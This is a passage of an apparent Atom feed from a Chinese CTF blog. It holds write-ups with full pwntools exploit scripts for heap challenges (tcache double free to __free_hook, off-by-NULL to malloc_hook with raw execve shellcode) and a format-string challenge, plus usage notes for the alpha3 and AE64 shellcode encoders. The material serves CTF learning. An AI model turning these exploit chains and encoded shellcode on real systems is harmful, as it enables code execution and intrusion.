+pause()
+add(11, 0x20)
+add(12, 0x20)
+edit(12, p64(system_addr))
+dele(10)
+
+p.interactive()
+
+</code></pre>
+<h1 id="fastnote">fastnote</h1>
+<p>2.31的libc，double free + tcache</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./vuln')
+libc = ELF('./libc-2.31.so')
+def add(idx,size,content):
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(b&quot;1&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;Size: &quot;)
+	p.sendline(str(size))
+	p.recvuntil(&quot;Content: &quot;)
+	p.sendline(content)
+
+def show(idx):
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(b&quot;2&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	
+def dele(idx):
+	p.recvuntil(&quot;:&quot;)
+	p.sendline(b&quot;3&quot;)
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	
+#gdb.attach(p)
+for i in range (0,8):
+	add(i,0x80,'a')
+add(8,0x20,'a')
+for i in range (0,8):
+	dele(i)
+show(7)
+libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x7f4d259cebe0 + 0x7f4d25843c90 - 0x61C90
+__free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+system_addr = libc_base + libc.sym[&quot;system&quot;]
+print(hex(libc_base))
+for i in range (0,10):
+	add(i,0x20,'a')
+add(10,0x20,'a')
+for i in range (0,8):
+	dele(i)
+dele(8)
+dele(9)
+dele(8)
+for i in range (0,7):
+	add(i,0x20,'/bin/sh')
+add(7,0x20,p64(__free_hook))
+add(8,0x20,p64(__free_hook))
+add(9,0x20,p64(system_addr))
+add(10,0x20,p64(system_addr))
+dele(6)
+#pause()
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[alpha3和AE64使用]]></title>
+        <id>https://l1u66.github.io/post/alpha3-he-ae64-shi-yong/</id>
+        <link href="https://l1u66.github.io/post/alpha3-he-ae64-shi-yong/">
+        </link>
+        <updated>2024-02-29T09:24:56.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="alpha3">alpha3</h1>
+<p>1.生成shellcode</p>
+<pre><code>from pwn import *
+context.arch='amd64'
+sc = shellcraft.sh()
+print asm(sc)
+</code></pre>
+<p>2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件</p>
+<pre><code>python sc.py &gt; shellcode
+</code></pre>
+<p>3.使用</p>
+<pre><code>python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot;
+</code></pre>
+<p>我这里只能用python2，不然说我缺少一些库？？？？</p>
+<pre><code>x86 ascii uppercase (数字+大写字母)
+
+x86 ascii lowercase (数字+小写字母)
+
+x86 ascii mixedcase (数字+大小写字母)
+</code></pre>
+<pre><code>Valid base address examples for each encoder, ordered by encoder settings,
+are:
+
+[x64 ascii mixedcase]
+  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI
+
+[x86 ascii lowercase]
+  AscLow 0x30 (rm32)        ECX EDX EBX
+
+[x86 ascii mixedcase]
+  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
+                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]
+                            ECX+2 ESI+4 ESI+8
+  AscMix 0x30 (i32)         (address)
+  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty
+                            countslide:EBX+offset~uncertainty
+                            countslide:ECX+offset~uncertainty
+                            countslide:EDX+offset~uncertainty
+                            countslide:ESI+offset~uncertainty
+                            countslide:EDI+offset~uncertainty
+  AscMix Countslide (i32)   countslide:address~uncertainty
+  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3
+
+[x86 ascii uppercase]
+  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
+                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]
+
+[x86 latin-1 mixedcase]
+  Latin1Mix CALL GetPC      call
+
+[x86 utf-16 uppercase]
+  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
+                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]
+</code></pre>
+<h1 id="ae64">AE64</h1>
+<p>使用</p>
+<pre><code>from pwn import *
+from ae64 import AE64
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+p = process('./example1')
+
+obj = AE64()
+sc = obj.encode(asm(shellcraft.sh()),'r13')
+
+p.sendline(sc)
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[hgame2024(week 1) ezfmt string]]></title>
+        <id>https://l1u66.github.io/post/hgame2024week-1-ezfmt-string/</id>
+        <link href="https://l1u66.github.io/post/hgame2024week-1-ezfmt-string/">
+        </link>
+        <updated>2024-02-28T15:02:43.000Z</updated>
+        <content type="html"><![CDATA[<p>这道题要注意本地gdb调试第十八个参数可能啥都没有，但是用python附加调试的时候就蹦出来个三连😇<br>
+学习脚本如下</p>
+<pre><code>from pwn import *
+context(log_level='debug',arch='amd64')
+
+#io=remote(&quot;47.100.137.175&quot;,31992)
+io=process(&quot;./vuln&quot;)
+
+#gdb.attach(io)
+# pause()
+
+backdoor=0x401245
+
+io.recvuntil(b&quot;?\n&quot;)
+
+payload=&quot;%{}c%{}$hn&quot;.format((backdoor)&amp;0xffff,18).encode()
+payload=payload.ljust(0x40,b&quot;\x00&quot;)+b&quot;\xc8&quot;
+io.send(payload)
+
+io.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ezheap]]></title>
+        <id>https://l1u66.github.io/post/ezheap/</id>
+        <link href="https://l1u66.github.io/post/ezheap/">
+        </link>
+        <updated>2024-02-26T12:12:11.000Z</updated>
+        <content type="html"><![CDATA[<p>查看保护（libc版本为2.27）<br>
+<img src="https://l1u66.github.io//post-images/1708954216740.png" alt="" loading="lazy"><br>
+保护全开,虽然有itemlist，存在chunk的地址，但是开了PIE，无法直接使用unlink进行数据修改，并且程序不存在后门函数，但是开了一块可写可执行的地址块，并且运行时会将该地址打印出来，所以主要攻击思路<strong>就是把shellcode写入此地址，然后可以通过劫持malloc_hook函数执行shellcode拿到shell</strong></p>
+<h1 id="alloc函数">alloc函数</h1>
+<figure data-type="image" tabindex="1"><img src="https://l1u66.github.io//post-images/1709285505525.png" alt="" loading="lazy"></figure>
+<h1 id="del函数">del函数</h1>
+<figure data-type="image" tabindex="2"><img src="https://l1u66.github.io//post-images/1709285410846.png" alt="" loading="lazy"></figure>
+<h1 id="fill读取函数">fill读取函数</h1>
+<p><img src="https://l1u66.github.io//post-images/1709285449379.png" alt="" loading="lazy"><br>
+发现存在off by NULL漏洞</p>
+<h1 id="主要思路">主要思路</h1>
+<p>程序中存在编辑函数，需要借助它写入shellcode和劫持malloc_hook函数，那么则需要在可写可执行的地址块和malloc_hook地址处创造fake chunk，由于存在off by NULL漏洞，所以可以通过freed chunk合并实现freed chunk的fd和bk指针修改，从而之后可以把chunk分配到目标地址实现修改，unsorted bins第一次申请时，fd和bk会指向&lt;main_arena + 96&gt;处（64位），而&lt;main_arena + 96&gt;只与malloc_hook函数相差一个字节</p>
+<h1 id="向后合并流程">向后合并流程</h1>
+<p>1.检查p指向chunk的size字段的pre_inuse位，是否为0（也就是检查当前chunk的前一块chunk是否是free的，如果是则进入向前合并的流程)<br>
+2.获取前一块chunk的size，并加到size中（以此来表示size大小上已经合并）<br>
+3.根据当前chunk的presize来获得指向前一块chunk的指针<br>
+4.将这个指针传入unlink的宏（也就是让free掉的chunk的前一块chunk进入到unlink流程）</p>
+<h1 id="exp如下">exp如下</h1>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./ezheap')
+
+def add(size):
+	p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;)
+	p.sendlineafter(&quot;Size: &quot;, str(size))
+	p.recvuntil('0x')
+	return int(p.recv(12),16)
+    	
+def dele(idx):
+	p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;2&quot;)
+	p.sendlineafter(&quot;Index: &quot;, str(idx))
+
+def edit(idx, content):
+	p.sendlineafter(&quot;&gt;&gt; &quot;, &quot;3&quot;)
+	p.sendlineafter(&quot;Index: &quot;, str(idx))
+	p.sendlineafter(&quot;Content: &quot;, content)
+
+p.recvuntil('0x')
+mmap_addr = int(p.recv(10),16)
+#gdb.attach(p)
+add(0x410)  #大小在unsorted bin内，为后续unlink做准备(bk需要是0x4f0的chunk的地址)
+add(0x18)   
+add(0x28)   
+add(0x4f0)  #size=0x500，可利用off by NULL将标志位置0，实现chunk覆盖
+add(0x10)   #防止与top chunk合并
+dele(0)     #为后续unlink做准备
+edit(2,p64(0)*4+p64(0x470)) #实现chunk合并
+dele(3) #实现chunk合并
+dele(1) 
+dele(2) #将其置入tcache bin中
+add(0x430) 
+add(0x520)
+edit(0,b'a'*0x410+p64(0)+p64(0x20)+p64(mmap_addr))
+edit(1,&quot;\x30&quot;)
+add(0x18)
+add(0x18)   #修改fd为shellcode地址
+shellcode = b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot; #有现成的0x18字节之内的shellcode
+edit(3,shellcode)
+add(0x28)
+add(0x28)
+edit(6,p64(mmap_addr))  #修改fd为malloc_hook地址
+
+p.sendlineafter(&quot;&gt;&gt; &quot;, b&quot;1&quot;)
+p.sendlineafter(&quot;Size: &quot;,b&quot;0&quot;)
+
+p.interactive()
+
+</code></pre>
+]]></content>
+    </entry>
+</feed>
